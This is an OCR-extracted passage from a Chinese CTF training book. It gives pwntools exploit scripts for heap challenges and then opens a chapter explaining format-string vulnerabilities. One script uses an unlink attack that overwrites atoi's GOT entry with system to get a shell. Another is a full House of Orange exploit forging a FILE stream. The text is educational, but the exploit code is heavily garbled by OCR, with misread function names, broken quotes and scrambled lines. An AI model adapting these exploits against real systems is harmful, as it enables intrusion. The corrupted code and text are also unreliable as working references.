delete_note(io,1)
delete_note（io,3)
edit_note（io,0,0x98,“a"*0x98）
list_note(io)
data=io.readuntil(n")[:-1]
print [c for cin data]
heap_addr= 164(data[:8].ljust(8,“x00"))
manager_addr=heap_addr-0x19d0+0x10
print "heap_addr:",hex(heap_addr)
print"manager_addr:",hex(manager_addr)
node0_addr=manager_addr+0x10+0x18*0+0x10
---
## Page 537
CTF特训营：技术详解、解题方法与
13.4真题解析
537/1144
#usefullcode begin
bits =64#32
if bits == 32:
p_func=132
field_size=4
else:
p_func=|64
field_size=8
p0=p_func(0x0)
p1=p_func(0x81)
p2=p_func(node0_addr-3*field_size)
p3=p_func(node0_addr-2*field_size)
node1_pre_size =p_func(0x80)
node1_size=p_func(Ox80+2*field_size)
+zisdpou+（,zispey-oxosn+d+zd+d+od=oee
node1size
#edit node0,over write node1
edit _note（io,0,len（data0),data0)
#delete node 1unlinknode0
delete_note(io,1)
#usefull code end
atoi_got
=0x0000000000602070
offset_atoi
=0x383a0
atoi_plt
=0x0000000000400760
offset_system=0x44c40
#remote
offset_atoi
=0x39ea0
#atoi_plt
=0x0000000000400760
offset_system = 0x46590
payload’="
payload += 164(0x02)
payload += 164(0x01)
payload += I64(0x8)
payload += I64(atoi_got)
payload=payload.just（0x90,a)
edit_note(io,0,len(payload),payload)
list_note(io)
io.read_until(*"o.")
data = io.read_until(n")[:-1]
atoi_addr=|64(data[:8].ljust(8,‘x00))
print“atoi_addr:",hex(atoi_addr)
libcbase=atoi addr-offset atoi
system_addr = libc_base + offset_system
---
## Page 538
CTF特训营：技术详解、解题方法与
13.4真题解析
538/1144
print“system_addr:",hex(system_addr)
payload ="
payload += 164(system_addr)
edit_note(io,O,len(payload),payload)
io.read_until(":")
io.writeline("/bin/sh:")
io.interact()
io=get_io（target)
pwn(io)
7.{houseoforange(2016-hitcon)}
glibc2.23环境下：
#/usr/bin/env python
#-*-coding:ut-8 -*
from pwn import *
binary='/houseoforange
elf =ELF(binary)
libc = elf.libc
io=process(binary,aslr=0)
context.log_level='debug
context.arch = elf.arch
myu64 = lambda x: u64(x.ljust(8, 0))
ub_offset=0x3c4b30
def menu(idx):
io.recvuntil(:)
io.sendline(str(idx))
def see():
menu(2)
def build(nm,length,pz,color):
menu(1)
io.recvuntil("")
io.sendline(str(length))
io.recvuntil(:")
io.sendline(nm)
io.recvuntil(":")
io.sendline(str(pz))
io.recvuntil("")
---
## Page 539
CTF特训营：技术详解、解题方法与
13.4真题解析
539/1144
io.sendline(str(color))
def upgrade(nm, length,pz, color):
menu(3)
io.recvuntil("")
io.sendline(str(length))
io.recvuntil("")
io.send(nm)
io.recvuntil(":")
io.sendline(str(pz))
io.recvuntil(":")
io.sendline(str(color))
pause()
build（0*8,0x90,1,1)
pay='c'*0x90
pay += p64(0)+p64(0x21)
pay+=p32(0)+p32（0x20)+p64（0)
pay+=p64(0)+p64（0xf21)
#overwrite the top chunk
pause()
upgrade(pay,len(pay),1,1)
#trigger_int_free()
build（1',0x1000,1,1)
#build a large chunk
build（2,0x400,1,1)
see()
io.recvuntil(":")
libc_addr=myu64(io.recvn（6))&~（0x1000-1)
log.info("\033[33m”+hex（libc_addr)+“033[0m")
libc.address =libc addr-0x3bd000
log.info("033[33m+hex（libc.address)+033[0m°)
#leak heap with fd_nextsize,bk_nextsize
upgrade(2*0x10,0x400,1,1)
see()
io.recvuntil("2"*0x10)
heap_addr=myu64（io.recvn（6)-0x140
log.info("1033[33m”+hex(heap_addr) +"033[0m")
#unsorted bin attack
pay=’a'*0x400
pay += p64(0) +p64(0x21)
pay+=p32(0x1f)+p32(0x1)+p64(0)
#stream=house_of_orange(0x555555758570,libc.symbols[system],libc.symbols
IO_listall])
---
## Page 540
CTF特训营：技术详解、解题方法与
13.4真题解析
540/1144
stream ='/bin/sh\0'+p64(0x61)
stream +=p64(0)+p64（libc.symbols[_1O_list_all]-0x10)
stream = stream.ljust（Oxa0,0)
#fp->_wide_data->_IO_write_ptr>fp->_wide_data->_IO_write_base
stream+=p64(heap_addr+0x610)
stream= stream.ljust(Oxc0,10)
stream += p64(1)
pay+=stream
pay+=p64（0)*2
##vtable
pay += p64(heap_addr+0x668)
pay+=p64(0)*6
pay += p64(libc.symbolssystem)
pay += stream
upgrade(pay, 0x800, 1, 1)
io.recvuntil(":")
io.sendline(*1)
io.interactive()
glibc2.24环境下，只需要将glibc2.23下exploit中的stream修改为
13.3.7节中的pack即可。至于更高版本中使用io_file虚表的利用方
法，这里不再做更多叙述。
---
## Page 541
CTF特训营：技术详解、解题方法与
14.1基本概念
541/1144
第14章格式化字符串漏洞
14.1基本概念
格式化字符事漏洞主要是针对一些格式化函数，如printf、sprintf
vsprint等。这些格式化函数利用格式化字符串来指定串的格式，在
格式串内部使用一些以“%”开头的格式说明符（format
specifications）来占据一个位置，在后面的变参列表中提供相应的变
量，最终函数就会使用相应位置的变量来代替那个说明符，产生一个
调用者想要的字符串。
下面列出几个比较关键的参数格式
%x(%lx)：替换为参数的值（十六进制）。
%p：替换为参数的值（指针形式）。
%s：替换为参数所指向内存的字符串。
%n：将格式化串中该特殊字符之前的字符数量写人参数中（获
取地址的参数）。
---
## Page 542
CTF特训营：技术详解、解题方法与
14.1基本概念
542/1144
下面简单了解下参数定位
在正常的情况下，格式化字符串所需的参数是依次往后索引的
如“%p.%x”，其对应于第1、2个参数。
也有一些特殊情况，如“%dSm”形式：其中，d代表数字（1，
2，.），用来定位参数列表中的第d个参数（从1开始算）；m为前面
所述的关键参数格式之一（x，p，s，n，….）。
简单的示例代码如下：
#include
int main()
int addr=Oxdeadbeef;
printf(%p,%pln,1, 2,&addr);
printf("%1Sp\n",1,2,&addr);
printf("%2$pln",1,2,&addr);
printf("%3$pln",1,2,&addr);
x86下测试的最终结果如图14-1所示。
0x1,0x2
0x1
0x2
0xff867b5c
---
## Page 543
CTF特训营：技术详解、解题方法与
14.1基本概念
543/1144
图14-1
printf函数的打印情况
printf("%p,%pln",1,2,&addr);=>0x1,0x2
printf(%1$pin"，1，2,&addr);=>0x1
printf(“%2$pln"，1,2,&addr);=>0x2
printf(“%3$pln°，1,2,&addr);=>0xff867b5c（addr的内存地址）
---
## Page 544
CTF特训营：技术详解、解题方法与
14.2信息泄雷与修改
544/1144
14.2信息泄露与修改
1.原理
通常，格式化函数是一种变长参数函数，后面的参数需要根据栈
的参数传递来进行释放，x86的参数全在栈上，x64的参数从第4个开
始放在栈上。这些格式化函数遇到格式说明符的关键字符之后，会按
照传参规则去寻找参数来进行替换或者修改，并不会关心真实的传参
情况。所以如果实际参数数量小于所需的参数数量，则其依然会将对
应位置的数值当成参数进行转换，从而引发格式化学符串漏洞。由此
可见，利用格式化字符串漏洞既能够泄露信息，又能够修改信息，功
能比较强大。
2.信息泄露
利用格式化漏洞来进行泄露主要是利用格式化字符串的参数转换
显示功能，示例代码如下：
#include
int main()
(u\d%d%d%d%d%d%d%d%）ud
printf(*%4$p.%7$p\n")
---
## Page 545
CTF特训营：技术详解、解题方法与
14.2信息泄雷与修改
545/1144
printf(%4$x.%7$xin);
printf(%4$s\n");
}
x86测试示例代码结果如图14-2所示。
0xf775b000.0x804842b.0xf771a000.0x8048420.(nil).(nil).0xf758aa83.0x1
0x8048420.0xf758aa83
8048420.f758aa83
UeeWVSoO
图14-2x86程序运行输出效果
d%d%d%d%d%，与d$L%ds%，‘用是Y1回Y
%p.%p.%p”中对应的第四和第七个参数是一样的。在printf调用时下
断点，观察函数栈情况，如图14-3所示。
对照测试结果，查看与第四个参数对应的地址中存放的内容，如
图14-4所示。
x64测试示例代码结果如图14-5所示
d%d%d%d%d%，与d$L%d$%‘用是Y1Y
%p.%p.%p”中对应的第七个参数是一样的，而第四个参数则不一样，
虽然这两个参数用的都是同一个寄存器r8，但是由于调用了函数，所
以寄存器的值发生了改变。在printf调用时下断点，观察函数栈的情
---
## Page 546
CTF特训营：技术详解、解题方法与.
14.2信息泄蛋与修改
546/1144
况如图14-6所示。
0x80483ca
:
0x80483cd
qns
esp,0x10
8x80483d2
:
Aou
6x80483d5
:
0x80482f4
0x80483da
naLn+22>:
nov
0x80483e2
:
call
0x80482f4
0x80483e7
:
ents:
ROV
eax,0x80484f4
:[0]6
d%.d%.d%dg.d%.)
10:0600
dsa
oxffrrds7o
Bx86484d0（"%p.%p.%p.%p.%p
Bxt7trde
format
1:0884
exffffds78
axfffrd574
x804842b
（:
add
ebx,0x1bc9)
3:0012
oxfffrds7c
oxf7fbcoo
4:0016|
oxffffd588
-->
848426
（:
-->0x1a8da8
0x0
push
ebp)
5:0020
oxffffds84
ebp
argl-arg7..
7:00281
exffffds8c
-->
xf7e2ca83(:
ROV
DHORD PTR [esp],eax)
gend:stack,code,data,heap,rodata,value
kpotnt 1,0xe80483d5 tn natn （）
xf7ffdo00.0x804842b.0xf7fbc089.0x8048420.(ntl).(ntl).0xf7e2ca83.0x1
图14-3x86程序函数栈状态
gdb-pedaS x/s 0x8048420
0x8048420:
"U\211\345WVS3500'
图14-4x86程序地址对应的数据
7de6f7e8.8x7fff
ec180.b97ec5
7ecs
9123456789abcdefghijklr
图14-5
5x64程序运行的输出效果